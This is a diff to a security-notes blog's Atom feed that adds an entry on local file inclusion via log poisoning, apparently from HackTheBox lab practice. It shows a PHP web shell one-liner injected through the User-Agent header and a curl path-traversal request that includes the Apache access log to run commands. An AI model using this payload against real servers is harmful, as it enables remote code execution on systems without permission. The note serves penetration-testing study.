@@ -4,13 +4,52 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-04-03T23:00:34+08:00</updated>
+ <updated>2022-04-03T23:14:25+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>LFI - Using access logs (Log Poisoning)</title>
+   <link href="https://mvineza.github.io/spindel/2022/04/03/lfi-using-access-logs-log-poisoning"/>
+   <updated>2022-04-03T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/04/03/LFI--Using-access-logs--Log-Poisoning-</id>
+   <content type="html">&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Ensure you can do LFI on access logs&lt;/li&gt;
+  &lt;li&gt;Insert this on useragent parameter&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php echo shell_exec($_GET['cmd']);?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/spindel/assets/LFI%20-%20Using%20access%20logs%20(Log%20Poisoning)/burp-changing-user-agent.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Include the logs on next request&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl 'http://10.10.8.194/?view=../../../../var/log/apache2/access.log&amp;amp;ext=&amp;amp;cmd=whoami'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;reference: [Remote Code Execution With LFI&lt;/td&gt;
+      &lt;td&gt;C:\Helich0pper](https://helich0pper.github.io/LFI/)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;HTB bart&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Complicated SQL Payloads</title>
